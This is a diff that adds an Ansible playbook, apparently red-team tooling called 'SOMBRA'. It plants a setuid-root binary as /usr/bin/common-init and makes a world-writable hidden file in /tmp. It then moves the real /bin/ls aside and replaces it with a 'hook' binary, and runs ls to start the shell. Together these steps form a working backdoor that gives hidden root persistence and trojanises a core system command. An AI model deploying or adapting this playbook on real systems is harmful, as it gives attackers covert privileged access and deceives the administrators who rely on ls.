@@ -1,0 +1,41 @@
+- name: Check if I already copied over the ls hook
+  stat:
+    path: /usr/bin/list
+  register: list
+
+- name: SOMBRA | Install shell | Linux
+  copy:
+    src: sombra
+    dest: /usr/bin/common-init
+    mode: '4755'
+
+- name: SOMBRA | Touch | Unux
+  file:
+    path: '/tmp/.runtime'
+    mode: '0777'
+    state: touch
+
+- name: SOMBRA | Move ls | Linux
+  copy:
+    remote_src: yes
+    src: /bin/ls
+    dest: /usr/bin/list
+    mode: '755'
+  when: not list.stat.exists
+
+- name: I didn't break ls you did
+  file:
+    path: /usr/bin/list
+    mode: '755'
+
+- name: SOMBRA | Copy ls hook | Linux
+  copy:
+    src: ls
+    dest: /bin/ls
+    mode: '755'
+  when: not list.stat.exists
+
+- name: SOMBRA | Init Shell | Linux
+  shell: "/bin/ls /"
+  args:
+    executable: "/bin/sh"
